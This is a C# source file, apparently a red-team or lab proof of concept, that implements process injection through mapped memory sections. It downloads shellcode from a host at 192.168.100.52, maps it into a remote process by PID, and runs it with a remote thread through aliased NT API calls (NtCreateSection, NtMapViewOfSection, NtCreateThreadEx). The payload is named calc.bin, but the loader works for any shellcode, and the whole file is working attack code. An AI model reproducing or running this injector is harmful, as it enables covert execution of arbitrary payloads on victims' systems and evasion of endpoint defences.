using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;


namespace ProcessInjectNT
{
    internal class Program
    {
        static void Main()
        {
            WebClient client = new WebClient();
            client.BaseAddress = "http://192.168.100.52";
            byte[] shellcode = client.DownloadData("calc.bin");

            var sc_size = (ulong)shellcode.Length;
            var hsec = IntPtr.Zero;
            ulong access = 0x10000000; // Section all access
            uint rwx = 0x40;           // PAGE_EXECUTE_READWRITE
            ulong cmt = 0x08000000;    // Section commit
            uint rw = 0x04;            // PAGE_READ_WRITE
            uint rx = 0x20;            // PAGE_EXECUTE_READ
            ulong rights = 0x001F0000; // STANDARD_RIGHTS_ALL

            //Create new memory block section in the current process
            NTApi.NTS(
                ref hsec,
                access,
                IntPtr.Zero,
                ref sc_size,
                rwx,
                cmt,
                IntPtr.Zero
                );

            //Map the view of the created section into the memory of the current process
            NTApi.NMVS(
                hsec,
                (IntPtr)(-1),   // Will target current Process
                out var local_addr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out var _,
                2,             // ViewUnmap (created view will not be inherited by child processes)
                0,
                rw
                );

            if (local_addr == IntPtr.Zero)
            {
                Console.WriteLine("Failed to map section");
                Console.WriteLine(Marshal.GetLastWin32Error());
            }
            else 
            {
                Console.WriteLine("Proceeding with copy");
            }
            //Copy the shellcode
            Marshal.Copy(shellcode, 0, local_addr, shellcode.Length);

            //Get a handle on the remote process and map the created region as RX into it
            int proc_id = 7792;
            var proc = Process.GetProcessById(proc_id);

            NTApi.NMVS(
                hsec,
                proc.Handle,
                out var remote_addr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out _,
                2,
                0,
                rx
                );


            //Create a remote thread in an attempt to execute the shellcode
            NTApi.NCTE(
                out _,
                rights,
                IntPtr.Zero,
                proc.Handle,
                remote_addr,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
                );
        }
    }
}
